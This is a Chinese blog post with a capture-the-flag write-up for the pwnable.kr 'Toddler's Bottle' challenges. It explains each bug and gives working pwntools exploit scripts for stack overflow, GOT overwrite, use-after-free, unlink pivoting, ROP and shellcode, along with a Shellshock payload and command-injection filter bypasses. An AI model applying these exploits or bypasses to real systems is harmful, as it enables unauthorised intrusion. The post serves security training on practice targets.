---
layout: post
title: "Pwnable Kr Toddler's Bottle Write Up"
---

# 0x00 背景

和leecode一样，感觉未来PWN选手基础的发展趋势，就是问你有没有刷过[pwnable.kr](http://pwnable.kr)和[pwnable.tw](https://pwnable.tw/)系列哇。算是巩固一下基础吧，把pwnable.kr的`Toddler's Bottle`部分做完了，遂形成此篇记录博客。篇幅所限，原始题目内容和运行环境以及开启的安全机制，大多省略或提及关键部分，着重记录了解题思路和利用脚本。

<!-- more -->

# 0x01 题解

## fd

这是一个编程问题，让你去了解Linux上的文件描述符，直接引用《UNIX环境高级编程》中“文件描述符”的内容吧：按照惯例，UNIX系统shell把文件描述符0与进程的标准输入关联。exp脚本如下：

```python
from pwn import *

context.log_level = 'debug'

s = ssh(host='pwnable.kr', user='fd', port=2222, password='guest')
p = s.process(['./fd', str(0x1234)])
p.sendline('LETMEWIN')
print p.recvall()
```

## collision

简单的编程问题，要求凑5个`int`数加起来等于hashcode，需要注意的是python在起程序时应该传递不了空指针`NULL`这样的参数。exp脚本如下：

```python
from pwn import *

context.log_level = 'debug'

c = ''
c += p32(0x01010101) * 4
c += p32(0x21DD09EC-0x01010101*4)

s = ssh(host='pwnable.kr', user='col', port=2222, password='guest')
p = s.process(['./col', c])
print p.recvall()
```

## bof

最最基础的漏洞利用题目，计算好偏移覆盖至栈帧中保存的参数即可。exp脚本如下：

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

payload = ''
payload += 'A' * 0x34
payload += p32(0xcafebabe)
r = remote('pwnable.kr', 9000)
#r = process('./bof')
#r.recvuntil('me : ')
r.sendline(payload)
r.interactive()
```

## flag

一道逆向工程的题目，有经验的同学通过`strings`看出是`upx`加壳的程序。比较原生态的做法是，通过`strace`看出有`write`的系统调用，对其[下断点](https://wizardforcel.gitbooks.io/100-gdb-tips/catch-syscall.html)后dump出原始的bin文件，再通过`strings`寻找可能的flag字符串。编写gdb command file如下：

```
!strace ./flag
file flag
catch syscall write
run
dump binary memory dumpfile 0x0000000000400000 0x00000000004c2000
!strings -n 16 dumpfile | head -n 3
quit
```

## passcode

这是一道编程错误导致的漏洞利用题目，初看时感觉没问题，输入两个passcode即可得到flag。但实际运行时会出现段错误，调试后可知程序在使用`scanf`时传递的不是变量指针，遂产生非法地址写：

```c
void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}
```

该程序的安全机制为`No PIE`和`Partial RELRO`，加上写入的地址可控，很自然地想到向`fflush.got.plt`中，写入判断成功后的程序地址即可。exp脚本如下：

```python
from pwn import *

context.log_level = 'debug'

fflush_got = 0x0804A004
ok = 0x080485E3

p = process('/home/passcode/passcode')
#gdb.attach(p)
#p.recvuntil('name : ')
p.sendline('A'*0x60+p32(fflush_got))
p.recvuntil('!\n')
p.sendline(str(ok))
print p.recvline()
```

## random

此题目为常见的编程错误。`man 3 rand`可知如果没有使用`srand`函数设置`seed`，则使用1作为种子。运行时的种子相同，产生的伪随机数序列也就相同可预知了。预测随机数的代码如下：

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	unsigned int random, key;
	random = rand();
	key = random ^ 0xdeadbeef;

	printf("Get random %d\n", random);
	printf("Get key %d\n", key);
	return 0;
}
```

## input

UNIX系统编程训练的题目。需要注意的是，其使用`char`来访问对应的参数，可使用`tubes.process.stderr`向标准错误[写入](https://github.com/Gallopsled/pwntools/blob/292b81af17/pwnlib/tubes/process.py#L971)。编程代码如下：

```python
from pwn import *

context.log_level = 'debug'

stage1 = ['C' for i in xrange(100)]
stage1[0] = './input'
stage1[ord('A')] = '\x00'
stage1[ord('B')] = '\x20\x0a\x0d'
stage1[ord('C')] = '62333'

stage3 = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}

with open('\x0a', 'w') as stage4:
    stage4.write('\x00\x00\x00\x00')

p = process(stage1, env=stage3)
p.recvuntil('clear!\n')

p.send('\x00\x0a\x00\xff')
p.stderr.write('\x00\x0a\x02\xff')
p.recvuntil('Stage 4 clear!\n')

l = remote('127.0.0.1', 62333)
l.send('\xde\xad\xbe\xef')
p.recvline('clear!\n')

p.recvall()
```

## leg

这一题考察ARM汇编的知识，直接引用《逆向工程实战》ARM章节里的知识点：

1. 通过BX和BLX指令进行分支跳转的时候，如果目标寄存器的最低有效位是1，就切换到Thumb状态。（尽管指令是2字节对齐或4字节对齐的，但处理器会忽略最低有效位，因此不会有对齐的问题。）
2. BLX（Branch with Link and Exchange）可以接受偏移量或寄存器作为跳转目标，而且在BLX指令使用偏移量的情况下，处理器总是会切换状态（ARM到Thumb或反之）。
3. R14用作连接寄存器（Link Register， LR），通常用于在函数调用中保存返回地址。
4. R15用作程序计数器（Program Counter, PC）。在ARM状态下执行的时候，PC是当前指令的地址加8（两条ARM指令之后）；在Thumb状态下，它是当前指令的地址加4（两条16位Thumb指令之后）。

最终计算脚本如下：

```python
key1_pc = 0x00008ce4 
key2_thumb_addr = 0x00008d08 + 4
key3_lr = 0x00008d80
print key1_pc+key2_thumb_addr+key3_lr
```

## mistake

此题目提示是一个编程错误，但乍一看是读取password文件，和输入的password对比正确才给flag，逻辑上看不出什么问题，实际运行和反汇编就可以知道，在判断fd时由于操作符的优先级问题，使得fd在表达式中被赋值为0，那么原始password就是从标准输入读取了，是我们可控的内容：

```c
int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}
```

IDA里面看也比较直观：

```c
  v8 = __readfsqword(0x28u);
  v3 = open("/home/mistake/password", 0, 256LL, argv);
  if ( v3 >= 0 )
  {
    puts("do not bruteforce...");
    v5 = time(0LL);
    sleep(v5 % 20);
    if ( (signed int)read(0, &buf, 0xAuLL) > 0 )
    {
      printf("input password : ", &buf);
      __isoc99_scanf("%10s", &s2);
      xor((__int64)&s2, 10);
      if ( !strncmp(&buf, &s2, 0xAuLL) )
      {
        puts("Password OK");
        system("/bin/cat flag\n");
      }
```

exp脚本如下：

```python
import time
from pwn import *

context.log_level = 'debug'

password1= 'A'*10
password2 = ''.join([chr(ord(x)^1) for x in password1])

p = process('/home/mistake/mistake')
p.recvuntil('bruteforce...\n')
time.sleep(20)
p.sendline(password1)
#p.recvuntil('password : ')
p.sendline(password2)
p.recvuntil('OK\n')
print p.recvline()
```

## shellshock

此题是对shellshock漏洞的利用，可参看[《实验三ShellShock 攻击实验》](https://www.cnblogs.com/wangba/p/4523420.html)，有时间也可以对CVE-2014-6271进行深入分析。简单的利用方式如下：

```bash
export x='() { :;};/bin/cat flag'
./shellshock
```

## coin1

此题目考察编程能力，从一堆好币中称出唯一的坏币，使用二分法的思想，递归地去称重量不对的那一部分。编程脚本如下：

```python
from pwn import *

context.log_level = 'debug'

def scale(k, i, c):
    i += 1
    if i > c:
        return False

    if len(k) == 1:
        m = n = k
    else:
        m = k[:len(k)/2]
        n = k[len(k)/2:]
    
    t = ' '.join([str(x) for x in m])
    r.sendline(t)
    s = r.recvline(False)
    
    if 'Correct' in s:
        return
    elif s == str(10*len(m)):
        scale(n, i, c)
    else:
        scale(m, i, c)

def run():
    s = r.recvline(False).split(' ')
    n = s[0].split('=')[1]
    c = s[1].split('=')[1]

    i = 0
    k = [x for x in xrange(int(n))]
    scale(k, i, c)

r = remote('127.0.0.1', 9007)
r.recvuntil('3 sec... -\n')
r.recvline()

for i in xrange(100):
    run()

print r.recvall()
```

## blackjack

这道题目源代码看似有些多，但还是编程错误的问题。运行一遍便可理解为21点牌的玩法，虽然庄家有些黑（先跟你比大小再看自己有没有爆掉），但在下注时的问题还是蛮明显的。`betting`函数中只做了一次校验，算是一种整数溢出吧，赢几次或者输几次成为百万富翁即可得到flag。缺陷代码如下：

```c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```

## lotto

此题目还是一个编程错误的问题。看样子像是要我们预测6位随机数，但奇怪的是没有用`strncmp`函数，而是套了两层for循环：

```c
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}
```

这就意味着输入的6个相同的数，只要有1个出现在随机数序列中即可拿到flag，大大提升了命中的概率。预测脚本如下：

```python
from pwn import *

context.log_level = 'debug'

n = p64(0x0101010101010101)
s = ssh(host='pwnable.kr', user='lotto', port=2222, password='guest')
p = s.process(['./lotto'])
p.recvline_endswith('Exit')
p.sendline('1')

for i in xrange(10):
    p.recvuntil('bytes : ')
    p.sendline(n)
    p.recvline()
    r = p.recvline()
    if r != 'bad luck...\n':
        print r
        break
```

## cmd1

简单的命令注入绕过题目。覆盖了`PATH`环境变量，使用绝对路径绕过，检测`flag`、`sh`、`tmp`关键字，使用`*`匹配即可。绕过方法如下：

```bash
 ./cmd1 '/bin/cat f*'
```

## cmd2 

命令注入绕过的进阶版，增加了对`/`的检测，参考过[《命令执行的一些绕过技巧》](https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/)后，感觉还是需要对字符进行编码解码绕过。常见的思路为借助根目录或者`printf \ddd`的形式绕过，绕过方式如下：

```bash
cd /;/home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*'
./cmd2 '$(printf \\057)bin$(printf \\057)cat f*'
```

[writeup](http://pwnable.kr/writeup.php?task_no=49)当中还有借助`command -p`命令来使用默认的`PATH`，这一招也是够独特的。

## uaf

最基础的UAF漏洞利用题目。利用的关键在于，先free掉原始的对象，然后使用新分配的内容占住原始内存，进而覆盖原始对象的相关结构，如此题目中的虚表，当再次use时即可劫持ip跳转至`give_shell`函数。利用脚本如下：

```python
from pwn import *

context.log_level = 'debug'

filename = '/tmp/larryxi/f'
content = p64(0x401570-8) + p64(0) + p64(0)
with open(filename, 'w') as f:
    f.write(content)

p = process(['/home/uaf/uaf', str(0x18), filename])
p.recvline('free')
p.sendline('1')
p.recvline('free')
p.sendline('3')
p.recvline('free')
p.sendline('2')
p.recvline('free')
p.sendline('2')
p.recvline('free')
p.sendline('1')

p.interactive()
```

## memcpy

此题目考察汇编基础。看似为普通的编程题目，在实际运行进入`fast_memcpy`函数的逻辑中在调用`movntps`指令会报错，搜索可知目的地址需要16字节或32字节对齐。同时注意到原程序使用`gcc -m32`编译为32位程序，但其具体的运行环境还是比较迷，探索后得出目标环境第1次`malloc`后的`mem`为16字节对齐的地址，而且`MALLOC_ALIGNMENT`为8。我们同时需要注意到libc决定分配大小的过程：

```c
/* pad request bytes into a usable size -- internal version */

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                             \
  if (REQUEST_OUT_OF_RANGE (req)) {					      \
      __set_errno (ENOMEM);						      \
      return 0;								      \
    }									      \
  (sz) = request2size (req);

```

所以我们调整一下使分配的chunk size为16字节的倍数，即可满足目的地址对齐的要求，具体代码如下：

```python
from pwn import *

context.log_level = 'debug'

# gcc -o memcpy memcpy.c -m32 -lm
chunk_header = 4
r = remote('pwnable.kr', 9022)
#r = process('./memcpy')
#gdb.attach(r)

for i in xrange(3, 13):
    r.recvuntil(' : ')
    n = 2**(i+1) - chunk_header
    #n = 2**i
    r.sendline(str(n))

r.recvuntil('experiment!\n')
print r.recvline()
```

但当我在ubuntu 18.04 x64平台上编译代码调试运行后发现，`n = 2**i`分配的chunk还是16字节对齐的：

```
//malloc(16)
gef➤  heap chunk 0x57ec0180
Chunk(addr=0x57ec0180, size=0x20, flags=PREV_INUSE)
Chunk size: 32 (0x20)
Usable size: 28 (0x1c)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

结合`/usr/lib/debug/lib/i386-linux-gnu/libc-2.27.so`的[debug信息](https://stackoverflow.com/questions/10000335/how-to-use-debug-version-of-libc)，反汇编libc的`_int_malloc`函数，发现这里确实是以16字节对齐来确定size的，稍微有些让本地测试的人有些迷惑哦：

```c
  if ( a2 + 19 <= 0xF )
  {
    v3 = 0;
    v2 = 16;
  }
  else
  {
    v3 = (a2 + 19) & 0xFFFFFFF0;
    v2 = v3;
    LOBYTE(v3) = v3 > 0xFFFFFFDF;
```

而在ubuntu 14.04 x86的平台上编译运行时，`mem`地址和`MALLOC_ALIGNMENT`均为8字节对齐，所以在处理`8 16 32 64 ...`这样的序列时就会报错：

```
//malloc(32)
gef➤  heap chunk 0x0804c030
Chunk(addr=0x804c030, size=0x28, flags=PREV_INUSE)
Chunk size: 40 (0x28)
Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

## asm

此题目考察汇编知识。借助[seccomp](https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)限制我们只能使用`open`、`read`、`write`、`exit`、`exit_group`这几个系统调用，来完成读取flag文件的shellcode操作。捷径的方法是借用`pwnlib.shellcraft`[构造](https://pwntools.readthedocs.io/en/stable/shellcraft.html#module-pwnlib.shellcraft)shellcode，其使用的思路在手工构造时还是很值得借鉴的，比如文档例子中的对要读取的文件名做[异或处理](https://pwntools.readthedocs.io/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.syscall)，以及使用寄存器作为参数构造[连续的](https://pwntools.readthedocs.io/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.itoa)系统调用。解题的构造脚本如下：

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

r = remote('pwnable.kr', 9026)
r.recvuntil('shellcode: ')

sc = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
sc += shellcraft.read('rax', 'rsp', 32)
sc += shellcraft.write(1, 'rsp', 32)

r.sendline(asm(sc))
print r.recvline()
```

## unlink

此题目是通过堆溢出unlink后达到任意地址写的效果。因为现在的堆机制对unlink的过程有较多[安全校验](https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/)，所以此题目虚拟了一个双向链表对象解链的操作：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

题目中存在明显的堆溢出，又主动泄露出了堆栈地址，首先会有2个思路：

1. 将B对象的fd和bk分别覆盖为`main`函数栈上保存的返回地址和`shell`函数地址，但unlink过程中需要两个地址是可写的。
2. 两个可写地址就覆盖为返回地址和堆地址，但程序开启了NX，无法在程序返回时跳转至堆执行我们的shellcode。

程序看似无解，但从反汇编的角度上还是看出了猫腻，在`main`函数结尾处存在不合常规的汇编指令，取栈上的内容再赋值给esp，相当于是帮我们做了一次栈迁移哇：

```
.text:080485EC sub     esp, 0Ch
.text:080485EF push    [ebp+var_C]
.text:080485F2 call    unlink
.text:080485F7 add     esp, 10h
.text:080485FA mov     eax, 0
.text:080485FF mov     ecx, [ebp+var_4]
.text:08048602 leave
.text:08048603 lea     esp, [ecx-4]
.text:08048606 retn
.text:08048606 ; } // starts at 804852F
.text:08048606 main 
```

这样事情就好办了，在栈上对应处写入内容可控的堆地址，函数返回前触发栈迁移至堆地址，最终`ret`至`shell`函数即可，利用脚本如下：

```python
from pwn import *

context.log_level = 'debug'

p = process('./unlink')
p.recvuntil('leak: ')
stack_addr = int(p.recvline(False), 16)
p.recvuntil('leak: ')
heap_addr = int(p.recvline(False), 16)
p.recvline()

#gdb.attach(p)
payload = ''
payload += p32(0x080484EB)
payload += p32(0x90909090) * 3
payload += p32(heap_addr+0xc)
payload += p32(stack_addr+0x10)

p.sendline(payload)
p.interactive()
```

目标平台上还有个`intended.py`，把unlink函数中栈上保存的前栈帧ebp值写为堆地址，在`main`函数结尾处栈迁移同样返回至`shell`函数，思路相同就是理解上有些麻烦：

```python
from pwn import *
context.arch = 'i386'    # i386 / arm
r = process(['/home/unlink/unlink'])
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)        # heap + 8  (new ret addr)
payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'        # heap + 16
payload += '4444'
payload += pack(stack - 0x20)    # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)    # edx.
r.sendline( payload )
r.interactive()
```

## blukat

这道题目考察的是编程错误或者说是运维错误，但我个人觉得出得不够好，故意把password文件的内容弄成`cat`命令的报错，但本质上还是具有可读权限的：

```
blukat@prowl:~$ ls -al
total 36
drwxr-x---   4 root blukat     4096 Aug 16  2018 .
drwxr-xr-x 114 root root       4096 May 19 15:59 ..
dr-xr-xr-x   2 root root       4096 Aug 16  2018 .irssi
drwxr-xr-x   2 root root       4096 Aug 16  2018 .pwntools-cache
-r-xr-sr-x   1 root blukat_pwn 9144 Aug  8  2018 blukat
-rw-r--r--   1 root root        645 Aug  8  2018 blukat.c
-rw-r-----   1 root blukat_pwn   33 Jan  6  2017 password
blukat@prowl:~$ id
uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)
blukat@prowl:~$ head password 
cat: password: Permission denied
```

把脑洞的坑绕过后，最终的flag计算就很简单了：

```python
password = 'cat: password: Permission denied\n'
key = '3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+'
flag = ''
for i in xrange(33):
    flag += chr(ord(password[i])^ord(key[i]))
```

## horcruxes

此题目是漏洞利用构造ROP链的练习，逆向可知存在明显的溢出问题：

```c
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
```

使用`gets`函数接收输入，`0x0a`也就成了badchar，造成许多代码段的地址无法使用，剩下的也无法构造常见的ROP绕过NX保护：

```
$ ROPgadget --badbytes "0a" --only "pop|ret" --binary horcruxes 
Gadgets information
============================================================
0x0809fc0d : pop ebx ; ret
0x0809f73a : ret
0x0809fdce : ret 0xeac1

Unique gadgets found: 3
```

最终的思路就是跳转至程序正常逻辑，其地址没有`0x0a`，间接泄露7个数值相加后即可通过校验，但在进入`atoi`函数中需要注意其在转换超过`int`范围的数时会产生[未定义](http://www.cplusplus.com/reference/cstdlib/atoi/)的行为，可使用[ctypes](https://docs.python.org/2/library/ctypes.html)进行数据类型的转换，利用脚本如下：


```python
from ctypes import c_int
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

#p = process('/home/horcruxes/horcruxes')
r = remote('pwnable.kr', 9032) 

padding = 'A' * 0x78
A = 0x0809FE4B
B = 0x0809FE6A
C = 0x0809FE89
D = 0x0809FEA8
E = 0x0809FEC7
F = 0x0809FEE6
G = 0x0809FF05
ropme = 0x0809FFFC
stage1 = flat(padding, A, B, C, D, E, F, G, ropme,endianness='little', word_size=32, sign=False)

r.recvuntil('Menu:')
r.sendline('1')
r.recvuntil('earned? : ')
r.sendline(stage1)

s = 0 
for i in xrange(7):
    r.recvuntil('EXP +')
    s += int(r.recvline()[:-2])
    #s &= 0xffffffff

s = c_int(s).value
r.recvuntil('Menu:')
r.sendline('1')
r.recvuntil('earned? : ')
r.sendline(str(s))
print r.recvline()
```

# 0x02 总结

这次篮球世界杯中国队恐怕只有易建联才过得安心，其他年轻球员的表现只能让评论员说是浪费了三年的光阴。战士上战场，老是混，就等着死吧。希望能坚持下去，做得多，这样可以看得多，自然想得多，可惜就是犯了贪念啊。
